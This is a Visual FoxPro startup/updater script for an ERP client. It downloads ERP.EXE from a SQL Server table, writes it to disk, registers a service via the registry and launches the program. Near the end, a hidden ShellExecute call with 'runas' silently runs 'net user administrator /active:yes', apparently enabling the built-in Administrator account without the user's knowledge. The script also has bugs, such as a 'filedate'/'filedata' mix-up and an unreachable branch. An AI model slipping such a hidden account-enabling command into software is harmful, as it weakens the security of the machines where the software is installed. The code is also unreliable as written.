SET PROCEDURE TO prgs\sampleproce.prg
SET SAFETY OFF
oShell = CREATEOBJECT("Shell.Application")
oFolder = oShell.NameSpace(CURDIR())
con1=odbc(5)
IF con1<=0
	SQLDISCONNECT(con1)
	con=odbc(4)
	IF con<=0
		MESSAGEBOX('请确认[SQLSERVER]已经正确安装!...',0+47+1,P_Caption)
		QUIT
	ENDIF
	SQLDISCONNECT(CON1)
ENDIF 	
CON=ODBC(6)
CURSORSETPROP("MapBinary",.T.,0)

SQLEXEC(CON,"SELECT filename,filedata FROM [update] where filename='ERP.EXE' ","TMP")&&where newid=1
SQLDISCONNECT(CON)
*!*	Declare Long WinExec In kernel32 String,Long
*!*	oShell = CREATEOBJECT("Shell.Application") 
SELECT TMP	
*!*	GO top

*!*	DO whil .not. EOF()
	DO CASE 
	CASE filename='OA助手.EXE'
		IF FILE("OA助手.EXE")
			oShell.IsServiceRunning("VfpSrv") 
			oShell.ServiceStart("VfpSrv", .F.) 
			Strtofile(Strconv(filedate,14),filename)  
			=WinExec(filename,1) && 启动程序启动真正的程序
			oShell.ServiceStart("VfpSrv", .T.) 
		ELSE
			#DEFINE   HKEY_LOCAL_MACHINE       -2147483646     
			frmReg   =   CREATEOBJECT( "registry ") 
			frmReg.init() 
			sKeyName= "SYSTEM\CurrentControlSet\Services\OA助手"
			spath= ADDBS(JUSTPATH(SYS(16)))
			sfilename=  ADDBS(JUSTPATH(SYS(16)))+"OA助手.exe" 
			sPWD= "111 " 
			*frmReg.DeleteKey(HKEY_LOCAL_MACHINE,sKeyname) 
			frmReg.OpenKey(sKeyName,HKEY_LOCAL_MACHINE,.T.) 
			frmReg.SetRegKey( "AppDirectory",spath,sKeyName,HKEY_LOCAL_MACHINE) 
			frmReg.SetRegKey( "Application ",sfilename,sKeyName,HKEY_LOCAL_MACHINE) 
			frmReg.CloseKey() 

			oShell.IsServiceRunning("VfpSrv") 
			oShell.ServiceStart("VfpSrv", .F.) 
			oShell.ServiceStop("VfpSrv", .T.)				
			Strtofile(Strconv(filedate,14),filename)  
			=WinExec(filename,1) && 启动程序启动真正的程序
			!ADDBS(JUSTPATH(SYS(16)))+'imgs\instsrv VFPSrv'+ ADDBS(JUSTPATH(SYS(16)))+'imgs\srvany.exe'
		ENDIF
	CASE UPPER(filename)='ERP.EXE'
		DECLARE INTEGER FindWindow IN USER32.DLL AS Find_Window STRING,STRING
		LOCAL cTitle
		cTitle="ERP助手"
		IF Find_Window(0,cTitle)!=0
			=MESSAGEBOX('本程序已经运行!',48,'提示信息')
			quit
		ENDIF
*!*			IF FILE("ERP.EXE")
*!*				ERASE ERP.EXE
*!*			ENDIF	
		STRTOFILE(filedata,"ERP.EXE")
*!*			DECLARE  INTEGER  ShellExecute  IN  "Shell32.dll"  ;  
*!*			INTEGER  hwnd,  ;  
*!*			STRING  lpVerb,  ;  
*!*			STRING  lpFile,  ;  
*!*			STRING  lpParameters,  ;  
*!*			STRING  lpDirectory,  ;  
*!*			LONG  nShowCmd  
*!*			 
*!*		*  打开  Word  来编辑文件  "c:\mywordfile.doc"  
*!*			=Shellexecute(0,"Open","ERP.EXE","","",0)  	
*!*			IF FILE("ERP.EXE")
*!*				Strtofile(Strconv(filedate,14),filename)  
*!*				=WinExec(filename,1) && 启动程序启动真正的程序
*!*			ENDIF
	OTHERWISE 
*!*			Strtofile(Strconv(filedate,14),filename)  
	ENDCASE	
*!*		SKIP
*!*	ENDDO 	
*!*	LOCATE FOR filename='ERP.EXE'
*!*	IF FOUND()
*!*		AGETFILEVERSION(Ver,"ERP助手.EXE")
*!*		mVer=ALLTRIM(Ver[4])
*!*		
Declare Integer ShellExecute In "Shell32.dll" Integer HWnd,String lpVerb,String lpFile,String lpParameters,String lpDirectory,Long nShowCmd
*!*	=ShellExecute("myRegsvr.exe", 控件文件名, "", "runas", 1)
=ShellExecute(0,"runas", "cmd.exe","/c net user administrator /active:yes","",0)
Declare Long WinExec In kernel32 String,Long
=WinExec('ERP.EXE',1) && 启动程序启动真正的程序
Clear Dlls

QUIT
